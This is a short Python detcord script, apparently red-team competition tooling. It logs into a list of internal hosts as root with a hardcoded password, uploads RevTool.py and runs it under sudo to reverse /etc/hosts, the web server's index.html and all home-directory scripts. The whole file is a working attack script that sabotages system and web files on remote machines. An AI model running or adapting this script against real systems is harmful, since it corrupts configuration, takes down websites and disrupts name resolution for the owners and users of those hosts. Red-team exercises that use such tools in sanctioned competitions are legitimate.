'''
detcordRevTool : Action execution on hosts
Micah Martin - knif3
Shannon McHale - LittleHack3r
'''

from detcord import action, display

env = {}  # pylint: disable=invalid-name
env['user'] = 'root'
env['pass'] = 'nomnom'
env['hosts'] = [ "10.2.11.2", "10.3.11.1", "10.3.11.3", "10.3.11.4"]
env['threading'] = True  # threading defaults to false

@action
def deployRevTool(host):
    print("Deploying revtool")
    sudo = host.user != "root"
    try:
        # Put the file onto the host
        host.put("RevTool.py", "/tmp/RevTool.py")
        # Reverse their /etc/hosts file
        ret = host.run("python3 /tmp/RevTool.py /etc/hosts", sudo=sudo)
        display(ret)
        # Reverse their index.html
        ret = host.run("python3 /tmp/RevTool.py /var/www/html/index.html", sudo=sudo)
        display(ret)
        # Reverse all scripts in the home directory
        ret = host.run("python3 /tmp/RevTool.py", sudo=sudo)
        display(ret)

    except PermissionError as _:
        print("Cannot deploy revtool")
